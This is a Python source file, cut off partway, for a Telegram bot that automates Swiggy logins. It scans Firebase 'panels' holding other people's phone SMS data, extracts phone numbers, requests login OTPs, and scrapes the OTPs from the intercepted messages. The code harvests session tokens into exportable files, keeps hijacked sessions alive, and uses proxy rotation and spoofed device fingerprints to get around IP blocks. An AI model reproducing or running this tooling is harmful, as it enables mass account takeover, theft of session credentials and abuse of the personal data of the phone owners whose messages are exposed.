#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
swiggy_bot.py — Swiggy Firebase Auto Login + Telegram Bot
  • Exact same bharat_final.py architecture (Telegram bot UI, inline buttons)
  • Swiggy auth endpoints + OTP patterns from v5
  • Full proxy rotation, LLS session support (ProxyRise etc.)
  • Firebase parallel scan: clients/devices/users root key detection
  • OTP polling with Swiggy-specific sender + text patterns
  • Session harvesting → sessions.json + sessions_minimal.json
  • Per-panel stats, live dashboard via Telegram message edits
  • Auto-restart loop with configurable delay
"""

from __future__ import annotations

import csv
import hashlib
import io
import json
import logging
import os
import random
import re
import tempfile
import threading
import time
import uuid
import warnings
import zipfile
from collections import defaultdict
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime, timezone
from pathlib import Path
from typing import Any
from urllib.parse import urlparse

try:
    from rich.console import Console as RichConsole
    from rich.live import Live as RichLive
    from rich.table import Table as RichTable
    from rich.panel import Panel as RichPanel
    from rich.columns import Columns as RichColumns
    from rich.text import Text as RichText
    from rich import box as rich_box
    RICH_AVAILABLE = True
except ImportError:
    RICH_AVAILABLE = False

warnings.filterwarnings("ignore", message=".*OpenSSL.*")
warnings.filterwarnings("ignore", category=UserWarning, module="urllib3")

import requests
import urllib3
import telebot
from telebot import types
from telebot.apihelper import ApiTelegramException

import account_ops

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ─── CONFIG ───────────────────────────────────────────────────────────────────
# Token is loaded from the environment, then from a gitignored bot_token.txt.
# It is never hardcoded in source.
TOKEN_FILE = Path("bot_token.txt")


def _load_bot_token() -> str:
    env = os.getenv("TELEGRAM_BOT_TOKEN", "").strip()
    if env and ":" in env and not env.startswith("your_"):
        return env
    if TOKEN_FILE.exists():
        try:
            tok = TOKEN_FILE.read_text(encoding="utf-8").strip()
            if tok and ":" in tok and not tok.startswith("your_"):
                return tok
        except Exception:
            pass
    return ""


TELEGRAM_BOT_TOKEN = _load_bot_token()

PANELS_FILE        = Path("panels.txt")           # Firebase URLs (one per line)
DISABLED_FILE      = Path("firebase_disabled.txt") # dead panels to skip
DISABLED_PANELS: set[str] = set()                  # runtime set of dead panel hostnames
_DEAD_THIS_SCAN: set[str] = set()                  # panels found dead during current scan
PROXIES_FILE       = Path("proxies.txt")           # one proxy per line
STORE_FILE         = Path("swiggy_store.json")
SESSIONS_FULL      = Path("sessions.json")
SESSIONS_MINIMAL   = Path("sessions_minimal.json")
SESSIONS_NEW       = Path("sessions_new.json")       # fresh/unregistered accounts harvested this run
SESSIONS_USED      = Path("sessions_used.json")       # phones already in sessions.json (skipped)
SESSIONS_BLOCKED   = Path("sessions_blocked.json")    # phones blocked/failed during OTP send
SESSIONS_RELOGIN   = Path("sessions_relogin.json")    # dead sessions needing re-harvest
SESSIONS_LOGGEDIN  = Path("sessions_loggedin.json")   # confirmed live sessions
LOG_FILE           = Path("swiggy_auto_log.json")
SUMMARY_DIR        = Path("summaries")
INDIVIDUAL_DIR     = Path("individual_sessions")

# Swiggy API endpoints
SMS_OTP_URL  = "https://profile.swiggy.com/api/v3/app/sms_otp"
VERIFY_URL   = "https://profile.swiggy.com/api/v3/app/login/verify"

# Session liveness check endpoint
SESSION_CHECK_URL = "https://profile.swiggy.com/api/v3/user/profile"

# Timing
WORKERS          = 10          # parallel phone workers
OTP_TIMEOUT      = 90          # 90s timeout for OTP polling (extended for slow panels)
POLL_MIN         = 0.7
POLL_MAX         = 1.4
MAX_RETRIES      = 1           # 1 re-poll on timeout before giving up
SCAN_WORKERS     = 64          # parallel HTTP for FB scan + OTP polling
FB_SCAN_TIMEOUT  = 10          # per-Firebase timeout
HTTP_RETRIES     = 2
REQUEST_TIMEOUT  = 15
MAX_AGE_MINUTES  = 2880        # 48h device freshness filter

# Proxy / 403 config
IP_BLOCK_THRESHOLD = 3
IP_BLOCK_COOLDOWN  = 120
IP_BLOCK_MAX_WAIT  = 600

# Auto-restart
AUTO_RESTART   = True
RESTART_DELAY  = 30

# Firebase root keys to try
ROOT_KEYS = ["clients", "devices", "users", "Clients", "Devices",
             "client", "device", "phones", "mobiles"]

# Firebase SMS subpaths for OTP polling
SMS_SUBPATHS = [
    "messages/{d}", "notifications/{d}", "sms/{d}",
    "notification/{d}", "inbox/{d}", "received/{d}",
    "sendSms/{d}", "{d}",
]

ONLINE_STATUS_FIELDS = ("status", "online", "isOnline", "connected", "active")
ONLINE_TRUE_VALUES   = {"true", "1", "online", "connected", "active", "yes"}

# Swiggy OTP regex patterns (priority order)
SWIGGY_OTP_PATTERNS = [
    re.compile(r"Use OTP\s+(\d{4,8})\s+to log into your Swiggy account", re.I),
    re.compile(r"Use\s+(\d{4,8})\s+as\s+(?:your\s+)?OTP\s+to\s+log\s+into\s+your\s+Swiggy", re.I),
    re.compile(r"(?:swiggy\s+login\s+otp|login\s+otp).*?\b(\d{4,8})\b", re.I),
    re.compile(r"\b(\d{4,8})\b.*?swiggy\s+login\s+otp", re.I),
    re.compile(r"Use OTP\s+(\d{4,8})", re.I),
    re.compile(r"OTP\s*(?:is|:)?\s*(\d{4,8}).{0,40}swiggy", re.I),
    re.compile(r"swiggy.{0,40}OTP\s*(?:is|:)?\s*(\d{4,8})", re.I),
    re.compile(r"(?:swiggy).*?\b(\d{6})\b", re.I),
]

# Phone regex
PHONE_RE = re.compile(r"(?:(?:\+|0{0,2})91[\s.\-]?)?([6-9]\d{9})\b")

PHONE_PATTERNS_WEIGHTED = [
    (re.compile(r'(?:phone|mobile|number|mob|no)[\s:]*(?:\+?91[\s-]?)?([6-9]\d{9})', re.I), 15),
    (re.compile(r'\b(?:\+91|91)?([6-9]\d{9})\b'), 10),
    (re.compile(r'[^0-9]([6-9]\d{9})[^0-9]'), 5),
]

ANDROID_DEVICES = [
    {"model": "Pixel 7",       "manufacturer": "Google",  "os": "13", "sdk": "33"},
    {"model": "Pixel 6a",      "manufacturer": "Google",  "os": "14", "sdk": "34"},
    {"model": "Pixel 8",       "manufacturer": "Google",  "os": "14", "sdk": "34"},
    {"model": "SM-S911B",      "manufacturer": "samsung", "os": "14", "sdk": "34"},
    {"model": "SM-A546B",      "manufacturer": "samsung", "os": "13", "sdk": "33"},
    {"model": "SM-G991B",      "manufacturer": "samsung", "os": "14", "sdk": "34"},
    {"model": "V2109",         "manufacturer": "vivo",    "os": "13", "sdk": "33"},
    {"model": "CPH2451",       "manufacturer": "OPPO",    "os": "13", "sdk": "33"},
    {"model": "RMX3630",       "manufacturer": "realme",  "os": "13", "sdk": "33"},
    {"model": "M2101K6P",      "manufacturer": "Xiaomi",  "os": "13", "sdk": "33"},
    {"model": "ONEPLUS A6000", "manufacturer": "OnePlus", "os": "13", "sdk": "33"},
    {"model": "Redmi Note 12", "manufacturer": "Xiaomi",  "os": "13", "sdk": "33"},
]

# ─── LOGGING ──────────────────────────────────────────────────────────────────
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(levelname)s | %(message)s",
)
logger = logging.getLogger(__name__)

# ─── BOT ──────────────────────────────────────────────────────────────────────
if not TELEGRAM_BOT_TOKEN or ":" not in TELEGRAM_BOT_TOKEN:
    raise RuntimeError(
        "TELEGRAM_BOT_TOKEN missing or invalid format (needs <id>:<token>)!\n"
        "Set it one of these ways:\n"
        "  export TELEGRAM_BOT_TOKEN='123456:ABC...'\n"
        "  echo '123456:ABC...' > bot_token.txt   (gitignored)"
    )

bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN)

# ─── GLOBAL STATE ─────────────────────────────────────────────────────────────
AUTO_RUNNING   = False
STORE: dict    = {"panels": [], "workers": WORKERS}
STATS          = {"processed": 0, "wins": 0, "fails": 0, "skipped": 0}
LIVE_QUEUE: list[str] = []
LIVE_MSG_ID    = None
LIVE_LOCK      = threading.Lock()
DEVICE_LOCK: dict[str, threading.Lock] = {}
DEVICE_LOCK_MUTEX = threading.Lock()
USED_NUMBERS: set[str] = set()
USED_NUMBERS_LOCK = threading.Lock()
user_sessions: dict = {}

# Track which panels had failures/timeouts so we can rerun them
FAILED_PANELS: set[str] = set()         # panel URLs that had any fail/timeout
FAILED_PANELS_LOCK = threading.Lock()

# Track newly added panels (per user, cleared after action taken)
_NEWLY_ADDED_PANELS: dict[int, list[str]] = {}  # user_id -> [panel_url, ...]

# Keep-alive worker state
_KEEPALIVE_RUNNING = False
_keepalive_lock = threading.Lock()

# Panel online count cache (populated during pre-sort in run_worker)
_PANEL_ONLINE_COUNTS: dict[str, int] = {}  # host -> online device count
_PANEL_ONLINE_LOCK = threading.Lock()

_states: dict = {}
_state_lock   = threading.Lock()

# ─── PROXY POOL ───────────────────────────────────────────────────────────────
_proxy_pool: list[str] = []
_proxy_index: int      = 0
_proxy_lock            = threading.Lock()
_lls_locked_proxy: str | None = None
_lls_lock              = threading.Lock()

# ─── SHARED LOCKS ─────────────────────────────────────────────────────────────
_sessions_lock  = threading.Lock()
_log_lock       = threading.Lock()
_block_lock     = threading.Lock()
_fb_stats_lock  = threading.Lock()

# 403 tracking
_ip_blocked     = False
_ip_block_until = 0.0
_consec_403     = 0
_total_403      = 0

# ─── HTTP SESSION (Firebase — no proxy needed) ─────────────────────────────────
_http = requests.Session()
_http.verify = False
_adapter = requests.adapters.HTTPAdapter(
    pool_connections=512, pool_maxsize=512, max_retries=0,
)
_http.mount("https://", _adapter)
_http.mount("http://",  _adapter)


# ═══════════════════════════════════════════════════════════════════════════════
# PROXY MANAGEMENT
# ═══════════════════════════════════════════════════════════════════════════════

def load_proxies() -> list[str]:
    if not PROXIES_FILE.exists():
        return []
    proxies = []
    for line in PROXIES_FILE.read_text(encoding="utf-8").splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        # socks5h:// means DNS through proxy — keep as-is, requests+PySocks handles it
        if not line.startswith(("http://", "https://", "socks4://", "socks5://", "socks5h://", "socks4a://")):
            line = "http://" + line
        proxies.append(line)
    return proxies


def test_proxy(proxy_url: str, timeout: int = 10) -> tuple[bool, str]:
    """Quick health check for a proxy. Returns (ok, ip_or_error)."""
    try:
        s = requests.Session()
        s.verify = False
        s.proxies = {"http": proxy_url, "https": proxy_url}
        r = s.get("https://api.ipify.org?format=json", timeout=timeout)
        if r.status_code == 200:
            ip = r.json().get("ip", "?")
            return True, ip
        return False, f"HTTP {r.status_code}"
    except Exception as e:
        return False, str(e)[:60]


def _extract_lls_token(response: requests.Response) -> str | None:
    return response.headers.get("X-PR-LLS") or response.headers.get("x-pr-lls")


def _build_lls_proxy(base: str, token: str) -> str:
    p = urlparse(base)
    locked_user = f"resfix-in-nnid-{token}"
    netloc = f"{locked_user}:{p.password}@{p.hostname}:{p.port}"
    return f"{p.scheme}://{netloc}"


def init_lls_session(proxy_url: str) -> str:
    global _lls_locked_proxy
    with _lls_lock:
        if _lls_locked_proxy:
            return _lls_locked_proxy
    try:
        s = requests.Session()
        s.verify = False
        s.proxies = {"http": proxy_url, "https": proxy_url}
        r = s.get("https://httpbin.org/ip", timeout=10)
        token = _extract_lls_token(r)
        if token:
            locked = _build_lls_proxy(proxy_url, token)
            with _lls_lock:
                _lls_locked_proxy = locked
            add_to_queue(f"🔒 LLS session locked → {token[:12]}…")
            return locked
    except Exception:
        pass
    with _lls_lock:
        _lls_locked_proxy = proxy_url
    return proxy_url


def current_proxy() -> str | None:
    with _proxy_lock:
        if not _proxy_pool:
            return None
        return _proxy_pool[_proxy_index % len(_proxy_pool)]


def rotate_proxy() -> str | None:
    global _proxy_index, _lls_locked_proxy
    with _proxy_lock:
        if not _proxy_pool:
            return None
        _proxy_index = (_proxy_index + 1) % len(_proxy_pool)
        new = _proxy_pool[_proxy_index]
    with _lls_lock:
        _lls_locked_proxy = None
    label = new.split("@")[-1] if "@" in new else new
    add_to_queue(f"🔄 Proxy rotated → {label}")
    return new


def get_swiggy_session() -> requests.Session:
    px = current_proxy()
    if not px:
        # no proxy — direct connection
        s = requests.Session()
        s.verify = False
        adapter = requests.adapters.HTTPAdapter(
            pool_connections=64, pool_maxsize=64, max_retries=0,
        )
        s.mount("https://", adapter)
        s.mount("http://",  adapter)
        return s
    if "resfix-in-nnid" in px:
        px = init_lls_session(px)
    s = requests.Session()
    s.verify = False
    adapter = requests.adapters.HTTPAdapter(
        pool_connections=64, pool_maxsize=64, max_retries=0,
    )
    s.mount("https://", adapter)
    s.mount("http://",  adapter)
    s.proxies = {"http": px, "https": px}
    return s


# ═══════════════════════════════════════════════════════════════════════════════
# 403 / IP BLOCK MANAGEMENT
# ═══════════════════════════════════════════════════════════════════════════════

def record_403() -> bool:
    global _ip_blocked, _ip_block_until, _consec_403, _total_403
    with _block_lock:
        _consec_403 += 1
        _total_403  += 1
        if _consec_403 >= IP_BLOCK_THRESHOLD and not _ip_blocked:
            if _proxy_pool:
                rotate_proxy()
                _consec_403 = 0
                return False
            wait_sec = min(
                IP_BLOCK_COOLDOWN * (_total_403 // IP_BLOCK_THRESHOLD),
                IP_BLOCK_MAX_WAIT,
            )
            _ip_blocked     = True
            _ip_block_until = time.time() + wait_sec
            add_to_queue(f"⛔ IP BLOCKED (no proxies) — cooldown {wait_sec}s")
            return True
    return False


def clear_403() -> None:
    global _consec_403
    with _block_lock:
        _consec_403 = 0


def wait_if_blocked() -> None:
    global _ip_blocked
    while True:
        with _block_lock:
            if not _ip_blocked:
                return
            remaining = _ip_block_until - time.time()
            if remaining <= 0:
                _ip_blocked  = False
                _consec_403  = 0
                add_to_queue("✅ IP cooldown over — resuming")
                return
        time.sleep(5)


# ═══════════════════════════════════════════════════════════════════════════════
# STORE / PERSISTENCE
# ═══════════════════════════════════════════════════════════════════════════════

def load_store() -> None:
    global STORE, USED_NUMBERS
    if STORE_FILE.exists():
        try:
            data = json.loads(STORE_FILE.read_text(encoding="utf-8"))
            STORE.update(data)
            USED_NUMBERS = set(data.get("used_numbers", []))
        except Exception:
            pass
    if PANELS_FILE.exists():
        try:
            existing = set(STORE.get("panels", []))
            for line in PANELS_FILE.read_text(encoding="utf-8").splitlines():
                u = line.strip()
                if u and not u.startswith("#") and u not in existing:
                    STORE.setdefault("panels", []).append(u)
                    existing.add(u)
        except Exception:
            pass
    DISABLED_PANELS.update(_load_disabled_panels())
    logger.info(f"Loaded {len(STORE.get('panels', []))} panels, {len(DISABLED_PANELS)} disabled")


def save_store() -> None:
    data = dict(STORE)
    data["used_numbers"] = list(USED_NUMBERS)
    STORE_FILE.write_text(json.dumps(data, indent=2), encoding="utf-8")


def _atomic_save(path: Path, data: list) -> None:
    tmp = path.with_suffix(path.suffix + ".tmp")
    tmp.write_text(json.dumps(data, indent=2, ensure_ascii=False), encoding="utf-8")
    tmp.replace(path)


def _load_json_list(path: Path) -> list:
    if not path.exists():
        return []
    try:
        d = json.loads(path.read_text(encoding="utf-8"))
        return d if isinstance(d, list) else []
    except Exception:
        return []


def already_saved(phone: str) -> bool:
    with _sessions_lock:
        return any(
            isinstance(s, dict) and str(s.get("mobile", "")).strip() == phone
            for s in _load_json_list(SESSIONS_FULL)
        )


def save_session_record(rec: dict) -> None:
    minimal = {k: rec.get(k, "") for k in
               ("mobile", "token", "sid", "tid", "deviceId", "customerId")}
    with _sessions_lock:
        fl = _load_json_list(SESSIONS_FULL)
        if not any(isinstance(s, dict) and str(s.get("mobile", "")).strip() == rec["mobile"] for s in fl):
            fl.append(rec)
            _atomic_save(SESSIONS_FULL, fl)
        ml = _load_json_list(SESSIONS_MINIMAL)
        if not any(isinstance(s, dict) and str(s.get("mobile", "")).strip() == minimal["mobile"] for s in ml):
            ml.append(minimal)
            _atomic_save(SESSIONS_MINIMAL, ml)
        # Also append to sessions_new.json (dedupe by mobile)
        nl = _load_json_list(SESSIONS_NEW)
        if not any(isinstance(s, dict) and str(s.get("mobile", "")).strip() == rec["mobile"] for s in nl):
            nl.append(rec)
            _atomic_save(SESSIONS_NEW, nl)
    # Save individual session file (full details + minimal)
    try:
        INDIVIDUAL_DIR.mkdir(exist_ok=True)
        mob = rec.get("mobile", "unknown")
        ind_path = INDIVIDUAL_DIR / f"{mob}.json"
        ind_path.write_text(json.dumps(rec, indent=2, ensure_ascii=False), encoding="utf-8")
    except Exception:
        pass


def append_log_entry(entry: dict) -> None:
    with _log_lock:
        logs = _load_json_list(LOG_FILE)
        logs.append(entry)
        _atomic_save(LOG_FILE, logs)


def now_iso() -> str:
    return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")


def generate_sessions_zip() -> bytes:
    """Generate a ZIP with all sessions in multiple formats."""
    all_sess = _load_json_list(SESSIONS_FULL)
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, mode="w", compression=zipfile.ZIP_DEFLATED) as zf:
        # 1. Full sessions.json
        zf.writestr("sessions.json", json.dumps(all_sess, indent=2, ensure_ascii=False))
        # 2. Minimal sessions
        minimal_list = [
            {k: s.get(k, "") for k in ("mobile", "token", "sid", "tid", "deviceId", "customerId")}
            for s in all_sess
        ]
        zf.writestr("sessions_minimal.json", json.dumps(minimal_list, indent=2, ensure_ascii=False))
        # 3. Individual per-phone JSONs (full details with timestamp + source panel)
        for s in all_sess:
            mob = s.get("mobile", "unknown")
            zf.writestr(f"{mob}.json", json.dumps(s, indent=2, ensure_ascii=False))
        # 4. tokens.txt
        token_lines = [f"{s.get('mobile', '')}:{s.get('token', '')}" for s in all_sess if s.get("token")]
        zf.writestr("tokens.txt", "\n".join(token_lines))
        # 5. CSV summary
        csv_buf = io.StringIO()
        writer = csv.writer(csv_buf)
        writer.writerow(["Mobile", "CustomerID", "Token", "SID", "TID", "DeviceID",
                         "Model", "Source Panel", "Completed At"])
        for s in all_sess:
            writer.writerow([
                s.get("mobile", ""), s.get("customerId", ""), s.get("token", "")[:40],
                s.get("sid", ""), s.get("tid", "")[:40], s.get("deviceId", ""),
                s.get("model", ""), s.get("sourcePanelHost", ""), s.get("completedAt", ""),
            ])
        zf.writestr("sessions_summary.csv", csv_buf.getvalue())
        # 6. Manifest
        zf.writestr("manifest.txt",
            f"Swiggy Bot — Session Export\n"
            f"Exported At : {now_iso()}\n"
            f"Total Sessions: {len(all_sess)}\n\n"
            f"Files:\n"
            f" - sessions.json (full records with all details)\n"
            f" - sessions_minimal.json (credentials only)\n"
            f" - <mobile>.json (individual session files)\n"
            f" - tokens.txt (mobile:token list)\n"
            f" - sessions_summary.csv (spreadsheet overview)\n"
        )
    buf.seek(0)
    return buf.read()


def _load_disabled_panels() -> set[str]:
    """Load disabled panel hostnames from firebase_disabled.txt."""
    disabled: set[str] = set()
    if DISABLED_FILE.exists():
        for line in DISABLED_FILE.read_text(encoding="utf-8").splitlines():
            line = line.strip()
            if line and not line.startswith("#"):
                host = (urlparse(line).hostname or line).lower() if "://" in line else line.lower()
                disabled.add(host)
    return disabled


def _disable_panel(panel_url: str) -> None:
    """Move a dead panel to firebase_disabled.txt and remove from active store."""
    host = (urlparse(panel_url).hostname or panel_url).lower()
    DISABLED_PANELS.add(host)
    # Append to disabled file
    try:
        with open(DISABLED_FILE, "a", encoding="utf-8") as f:
            f.write(f"{panel_url.rstrip('/')}/\n")
    except Exception:
        pass
    # Remove from store
    STORE["panels"] = [p for p in STORE.get("panels", [])
                       if (urlparse(p).hostname or "").lower() != host]
    save_store()



# ═══════════════════════════════════════════════════════════════════════════════
# SESSION LIVENESS CHECK
# ═══════════════════════════════════════════════════════════════════════════════

def check_session_live(session: dict) -> str:
    """
    Call Swiggy profile endpoint with the session's token/tid/sid.
    Returns 'LIVE', 'EXPIRED', or 'ERROR'.
    """
    tid   = session.get("tid", "")
    sid   = session.get("sid", "")
    token = session.get("token", "")
    dev   = session.get("deviceId", "")
    if not tid or token == "UNREGISTERED_ACCOUNT":
        return "EXPIRED"
    headers = {
        "Content-Type":  "application/json",
        "tid":           tid,
        "sid":           sid,
        "token":         token,
        "deviceId":      dev,
        "platform":      "Android",
        "User-Agent":    session.get("userAgent", "Swiggy-Android/1759 (Android 14; Pixel 6)"),
    }
    try:
        s = requests.Session()
        s.verify = False
        r = s.get(SESSION_CHECK_URL, headers=headers, timeout=12)
        if r.status_code == 200:
            data = r.json()
            # statusCode 999 = session expired
            if data.get("statusCode") == 999:
                return "EXPIRED"
            return "LIVE"
        elif r.status_code in (401, 403):
            return "EXPIRED"
        return "ERROR"
    except Exception:
        return "ERROR"


def check_all_sessions_live(sessions: list[dict], log_func=None) -> dict:
    """Check all sessions in parallel. Returns dict: mobile -> status."""
    results = {}
    lock = threading.Lock()

    def _check(s):
        mob = s.get("mobile", "?")
        status = check_session_live(s)
        with lock:
            results[mob] = status
            # Update the stored record
            if log_func:
                emoji = "🟢" if status == "LIVE" else "🔴" if status == "EXPIRED" else "⚠️"
                log_func(f"{emoji} {mob}: {status}")

    with ThreadPoolExecutor(max_workers=20) as ex:
        futs = [ex.submit(_check, s) for s in sessions]
        for f in as_completed(futs):
            try:
                f.result()
            except Exception:
                pass
    return results


# ═══════════════════════════════════════════════════════════════════════════════
# SESSION KEEP-ALIVE WORKER
# ═══════════════════════════════════════════════════════════════════════════════

def _session_keepalive_worker() -> None:
    """Background thread: every 30 min checks all sessions, routes dead ones to relogin queue."""
    global _KEEPALIVE_RUNNING
    while True:
        time.sleep(1800)
        with _keepalive_lock:
            if _KEEPALIVE_RUNNING:
                continue
            _KEEPALIVE_RUNNING = True
        try:
            all_sess = _load_json_list(SESSIONS_FULL)
            if not all_sess:
                _KEEPALIVE_RUNNING = False
                continue
            add_to_queue(f"🔁 Keep-alive: checking {len(all_sess)} sessions…")
            relogin_list = _load_json_list(SESSIONS_RELOGIN)
            relogin_mobiles = {str(s.get("mobile", "")).strip() for s in relogin_list if isinstance(s, dict)}
            loggedin_list = _load_json_list(SESSIONS_LOGGEDIN)
            loggedin_mobiles = {str(s.get("mobile", "")).strip() for s in loggedin_list if isinstance(s, dict)}

            updated_full: list[dict] = []
            now = now_iso()
            for s in all_sess:
                if not isinstance(s, dict):
                    updated_full.append(s)
                    continue
                mob = str(s.get("mobile", "")).strip()
                status = check_session_live(s)
                s_updated = dict(s)
                s_updated["sessionStatus"] = status
                s_updated["sessionStatusCheckedAt"] = now
                updated_full.append(s_updated)
                if status == "LIVE":
                    if mob not in loggedin_mobiles:
                        loggedin_list.append(s_updated)
                        loggedin_mobiles.add(mob)
                    else:
                        for i, ls in enumerate(loggedin_list):
                            if isinstance(ls, dict) and str(ls.get("mobile", "")).strip() == mob:
                                loggedin_list[i] = s_updated
                                break
                    add_to_queue(f"🟢 Keep-alive: {mob} LIVE")
                else:
                    loggedin_list = [ls for ls in loggedin_list
                                     if not (isinstance(ls, dict) and str(ls.get("mobile", "")).strip() == mob)]
                    if mob not in relogin_mobiles:
                        entry = dict(s_updated)
                        entry["expiredAt"] = now
                        relogin_list.append(entry)
                        relogin_mobiles.add(mob)
                    add_to_queue(f"🔴 Keep-alive: {mob} {status} → relogin queue")

            with _sessions_lock:
                _atomic_save(SESSIONS_FULL, updated_full)
            _atomic_save(SESSIONS_LOGGEDIN, loggedin_list)
            _atomic_save(SESSIONS_RELOGIN, relogin_list)
            add_to_queue(f"✅ Keep-alive done. Loggedin={len(loggedin_list)} Relogin={len(relogin_list)}")
        except Exception as exc:
            add_to_queue(f"⚠️ Keep-alive error: {exc}")
        finally:
            _KEEPALIVE_RUNNING = False


# ═══════════════════════════════════════════════════════════════════════════════
# QUEUE / LOG
# ═══════════════════════════════════════════════════════════════════════════════

def add_to_queue(msg: str) -> None:
    logger.info(msg)
    with LIVE_LOCK:
        LIVE_QUEUE.append(msg)
        if len(LIVE_QUEUE) > 50:
            LIVE_QUEUE.pop(0)


# ═══════════════════════════════════════════════════════════════════════════════
# STATE HELPERS (Telegram user state machine)
# ═══════════════════════════════════════════════════════════════════════════════

def set_state(uid: int, **data) -> None:
    with _state_lock:
        _states[uid] = data


def pop_state(uid: int) -> dict | None:
    with _state_lock:
        return _states.pop(uid, None)


def get_state(uid: int) -> dict:
    with _state_lock:
        return dict(_states.get(uid, {}))


def ib(text: str, callback_data: str = None, url: str = None) -> types.InlineKeyboardButton:
    kwargs: dict = {}
    if callback_data is not None:
        kwargs["callback_data"] = callback_data
    if url is not None:
        kwargs["url"] = url
    return types.InlineKeyboardButton(text=text, **kwargs)


# ═══════════════════════════════════════════════════════════════════════════════
# DEVICE FINGERPRINT + HEADERS
# ═══════════════════════════════════════════════════════════════════════════════

def generate_device_fingerprint() -> dict:
    seed = f"{time.time_ns()}-{uuid.uuid4()}-{random.random()}"
    h    = hashlib.sha256(seed.encode()).hexdigest()
    dev  = random.choice(ANDROID_DEVICES)
    vc   = random.randint(1680, 1780)
    av   = f"4.{random.randint(100, 115)}.{random.randint(0, 25)}"
    return {
        "deviceId":        str(uuid.uuid4()),
        "swuid":           h[16:32],
        "androidId":       h[:16],
        "installationId":  str(uuid.uuid4()),
        "model":           dev["model"],
        "manufacturer":    dev["manufacturer"],
        "osVersion":       dev["os"],
        "sdk":             dev["sdk"],
        "versionCode":     str(vc),
        "appVersion":      av,
        "plVersion":       str(random.randint(120, 145)),
        "userAgent":       f"Swiggy-Android/{vc} (Android {dev['os']}; {dev['model']})",
        "fingerprintHash": h[:16],
    }


def build_login_headers(fp: dict) -> dict:
    return {
        "Accept":        "application/json; charset=utf-8",
        "app-version":   fp["appVersion"],
        "category":      "food",
        "deviceId":      fp["deviceId"],
        "swuid":         fp["swuid"],
        "androidId":     fp["androidId"],
        "os-version":    fp["osVersion"],
        "pl-version":    fp["plVersion"],
        "User-Agent":    fp["userAgent"],
        "version-code":  fp["versionCode"],
        "x-channel":     "swiggy",
        "X-Device-Id":   fp["deviceId"],
        "platform":      "android",
        "Content-Type":  "application/json; charset=utf-8",
    }


# ═══════════════════════════════════════════════════════════════════════════════
# PHONE HELPERS
# ═══════════════════════════════════════════════════════════════════════════════

def norm_phone(v: Any) -> str:
    m = PHONE_RE.search(str(v or ""))
    return m.group(1) if m else ""


def find_phones(obj: Any) -> set[str]:
    found: set[str] = set()
    if isinstance(obj, dict):
        for v in obj.values():
            if isinstance(v, (dict, list)):
                found |= find_phones(v)
            else:
                p = norm_phone(v)
                if p:
                    found.add(p)
    elif isinstance(obj, list):
        for v in obj:
            found |= find_phones(v)
    return found


def is_suspicious_phone(digits: str) -> bool:
    if len(digits) != 10 or digits[0] not in "6789":
        return True
    if digits.endswith("000") or digits.endswith("0000"):
        return True
    if len(set(digits)) <= 3:
        return True
    if re.search(r"(\d)\1{4,}", digits):
        return True
    return False


def _clean_phone(raw: Any) -> str | None:
    if not raw:
        return None
    digits = re.sub(r"\D", "", str(raw))
    if digits.startswith("91") and len(digits) == 12:
        digits = digits[2:]
    if digits.startswith("0") and len(digits) == 11:
        digits = digits[1:]
    if len(digits) == 10 and digits[0] in "6789":
        if not is_suspicious_phone(digits):
            return digits
    return None


def _phone_from_device_fields(dev: dict) -> str | None:
    sims = dev.get("sims", [])
    if isinstance(sims, dict):
        sims = list(sims.values())
    if isinstance(sims, list):
        for sim in sims[:2]:
            if isinstance(sim, dict):
                for k in ("phoneNumber", "phone", "number", "mobNo", "mob"):
                    p = _clean_phone(sim.get(k))
                    if p:
                        return p
    for k in ("mobNo", "mob", "phoneNumber", "phone", "number", "mobile"):
        p = _clean_phone(dev.get(k))
        if p:
            return p
    return None


def _phones_from_messages(msgs: Any, top_n: int = 2) -> list[str]:
    counts: dict[str, int] = {}
    items = msgs.values() if isinstance(msgs, dict) else (msgs if isinstance(msgs, list) else [])
    for msg in items:
        if not isinstance(msg, dict):
            continue
        text = str(msg.get("body") or msg.get("message") or msg.get("text") or msg.get("content") or "")
        for pat, score in PHONE_PATTERNS_WEIGHTED:
            for num in pat.findall(text):
                digits = re.sub(r"\D", "", num)
                if digits.startswith("91") and len(digits) == 12:
                    digits = digits[2:]
                if len(digits) == 10 and digits[0] in "6789" and not is_suspicious_phone(digits):
                    counts[digits] = counts.get(digits, 0) + score
    if not counts:
        return []
    return sorted(counts, key=lambda x: counts[x], reverse=True)[:top_n]


# ═══════════════════════════════════════════════════════════════════════════════
# OTP PARSING (Swiggy-specific)
# ═══════════════════════════════════════════════════════════════════════════════

def parse_swiggy_otp(text: str) -> str | None:
    if not text:
        return None
    low = text.lower()
    if "swiggy" not in low:
        return None
    # skip non-login OTPs
    for bad in ("delete your account", "delete account", "to delete",
                "reset your password", "change your password",
                "update your", "verify your email"):
        if bad in low:
            return None
    for pat in SWIGGY_OTP_PATTERNS:
        m = pat.search(text)
        if m:
            if "delete" in low:
                return None
            return m.group(1)
    return None


# ═══════════════════════════════════════════════════════════════════════════════
# SWIGGY API CALLS
# ═══════════════════════════════════════════════════════════════════════════════

def _swiggy_msg(resp: dict) -> str:
    if not resp:
        return ""
    raw   = resp.get("raw") if isinstance(resp.get("raw"), dict) else {}
    inner = raw.get("data") if isinstance(raw.get("data"), dict) else {}
    parts = [
        resp.get("statusMessage"), raw.get("statusMessage"), raw.get("message"),
        inner.get("statusMessage"), inner.get("message"),
        str(raw.get("statusCode") if raw.get("statusCode") is not None else ""),
    ]
    for k in ("error", "errorMessage", "errorCode", "code"):
        if raw.get(k):   parts.append(str(raw[k]))
        if inner.get(k): parts.append(str(inner[k]))
    seen, out = set(), []
    for c in [str(p).strip() for p in parts if p and str(p).strip() and str(p).strip() != "None"]:
        if c not in seen:
            seen.add(c)
            out.append(c)
    return " | ".join(out)[:160]


def send_otp_swiggy(phone: str, headers: dict, sess: requests.Session = None) -> dict:
    wait_if_blocked()
    last_exc = None
    for attempt in range(1, HTTP_RETRIES + 1):
        s = sess if sess is not None else get_swiggy_session()
        try:
            r = s.get(f"{SMS_OTP_URL}?mobile={phone}",
                      headers=headers, timeout=REQUEST_TIMEOUT)
            try:
                data = r.json() if r.content else {}
            except Exception:
                data = {"_parse_error": True, "_body": (r.text or "")[:300]}

